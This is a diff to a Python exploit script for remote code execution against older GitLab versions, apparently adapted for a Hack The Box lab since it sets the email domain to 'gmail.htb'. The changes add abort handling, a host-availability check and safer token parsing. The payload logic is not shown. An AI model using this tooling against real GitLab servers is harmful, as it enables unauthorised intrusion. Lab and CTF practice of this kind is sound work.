@@ -28,7 +28,7 @@ class GitlabRCE:
         self.local_ip = local_ip
         self.port = 42069
         # change this if the gitlab has restricted email domains
-        self.email_domain = "gmail.com"
+        self.email_domain = "gmail.htb"
         self.session = requests.session()
         self.username = ""
         self.password = ""
@@ -39,6 +39,9 @@ class GitlabRCE:
         result = self.session.get(url, verify=False)
         parser = GitlabParse()
         token = parser.feed(result.text, i)
+        if not token:
+            print("could not get token!")
+            self.abort()
         return token
 
     def randomize(self):
@@ -95,6 +98,9 @@ class GitlabRCE:
     def prepare_payload(self):
         print("prepare_payload is not implemented")
 
+    def abort(self):
+        print("Something went wrong! ABORT MISSION!")
+        exit()
 
 class GitlabRCE1147(GitlabRCE):
     description = "RCE for Version <=11.4.7"
@@ -246,11 +252,12 @@ class GitlabRCE1281LFIUser(GitlabRCE1281LFI):
 class GitlabVersion(GitlabRCE):
     def test(self):
         try:
-            self.session.get(self.url, verify=False)
+            result = self.session.get(self.url, verify=False)
+            if result.status_code not in [200, 302]:
+                raise Exception("Host {} seems down".format(self.url))
         except Exception as e:
             print(e)
-            print("Something went wrong! ABORT MISSION!")
-            exit()
+            self.abort()
 
     def get_version(self):
         result = self.session.get(self.url + "/help", verify=False)
@@ -266,8 +273,8 @@ class GitlabVersion(GitlabRCE):
         print("The Version seems to be {}! Choose wisely".format(version))
         self.delete_user()
         if not version:
-            print("Could not get version! ABORT MISSION!")
-            exit()
+            print("Could not get version!")
+            self.abort()
 
 
 class GitlabParse(HTMLParser):
@@ -290,7 +297,10 @@ class GitlabParse(HTMLParser):
 
     def feed(self, data, i):
         super(GitlabParse, self).feed(data)
-        return self.tokens[i]
+        try:
+            return self.tokens[i]
+        except IndexError:
+            return None
 
 
 class ProjectIDParse(HTMLParser):
